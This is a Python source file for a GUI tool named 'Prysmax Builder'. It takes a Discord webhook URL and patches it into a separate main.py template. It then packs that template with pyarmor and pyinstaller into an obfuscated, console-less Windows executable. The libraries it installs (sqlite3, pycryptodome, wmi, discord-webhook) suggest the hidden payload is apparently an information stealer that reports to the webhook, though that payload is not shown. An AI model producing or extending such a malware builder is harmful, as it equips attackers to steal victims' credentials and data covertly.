import os
import subprocess
import PySimpleGUI as sg

def download_libraries():
    required_libraries = [
        'requests', 'json', 'base64', 'sqlite3', 'shutil', 'uuid', 'wmi', 'psutil',
        'subprocess', 'pyarmor==7.6.1', 'pyinstaller', 'glob', 're', 'platform', 'Pillow', 
        'zipfile', 'discord-webhook', 'pycryptodomex', 'pycryptodome', 'datetime', 'pywin32',
    ]

    for library in required_libraries:
        try:
            __import__(library)
        except ImportError:
            print(f"{library} not found. Downloading...")
            subprocess.check_call(['pip', 'install', library])

def compile_and_explore(webhook_url):
    if not os.path.exists("prysmax1builder"):
        os.makedirs("prysmax1builder")

    main_content = ""
    with open("main.py", 'r', encoding='utf-8') as main_file:
        main_content = main_file.read()

    # Replace the placeholder with the user-provided webhook URL
    main_content = main_content.replace('theapi2023 = "Here-Token"', f'theapi2023 = "{webhook_url}"')

    file_path = os.path.join("prysmax1builder", "main.py")
    with open(file_path, 'w', encoding='utf-8') as new_main_file:
        new_main_file.write(main_content)

    here = sg.popup_yes_no("Are you sure you want to compile your file to Executable?", title='Confirm Compilation', button_color=('white', 'purple'))
    if here == 'Yes':
        print("Compiling...")
        try:
            subprocess.run('pyarmor pack -e "--onefile --noconsole --icon=NONE" prysmax1builder\\main.py', shell=True)
        except:
            subprocess.run('pyarmor-7 pack -e"--onefile --noconsole --icon=NONE" prysmax1builder\\main.py', shell=True)

        print("File successfully compiled!")
        subprocess.run("explorer prysmax1builder\\dist", shell=True)
    else:
        print("Compilation canceled.")

def main():
    sg.theme('DarkPurple4')  # Purple theme
    sg.set_options(font=('Helvetica', 12))

    layout = [
        [sg.Text('Prysmax Builder', font=('Helvetica', 24), text_color='white', justification='center')],
        [sg.Text('Enter your Discord Webhook URL:', text_color='white'), sg.InputText(key='webhook_url')],
        [sg.Button('Download Libraries', button_color=('white', 'purple')), sg.Button('Compile and Explore', button_color=('white', 'purple')), sg.Button('Exit', button_color=('white', 'red'))],
    ]

    window = sg.Window('Prysmax Builder', layout, alpha_channel=0.8, grab_anywhere=True)

    while True:
        event, values = window.read()

        if event == sg.WINDOW_CLOSED or event == 'Exit':
            break
        elif event == 'Download Libraries':
            download_libraries()
            sg.popup("Libraries downloaded successfully!", text_color='white')
        elif event == 'Compile and Explore':
            webhook_url = values['webhook_url']
            compile_and_explore(webhook_url)

    window.close()

if __name__ == '__main__':
    main()
